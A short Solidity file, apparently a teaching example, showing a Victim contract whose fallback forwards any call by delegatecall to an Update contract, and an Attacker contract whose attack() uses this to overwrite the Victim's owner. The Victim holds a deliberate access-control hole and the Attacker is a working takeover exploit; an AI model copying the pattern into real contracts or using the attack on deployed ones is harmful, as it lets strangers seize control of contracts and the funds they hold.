// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract Victim {
    address public owner;
    Update public update;

    constructor(Update _update) {
        owner = msg.sender;
        update = _update;
    }

    fallback() external {
        (bool success, bytes memory data) = address(update).delegatecall(msg.data);
        require(success, "failed");
    }
}

contract Update {
    address public owner;

    function updateOwner(address _owner) public {
        owner = _owner;
    }
}

contract Attacker {
    Victim public victim;

    constructor(Victim _victim) {
        victim = _victim;
    }

    function attack(address _update) public {
        address(victim).call(abi.encodeWithSelector(Update(_update).updateOwner.selector, msg.sender));
    }
}
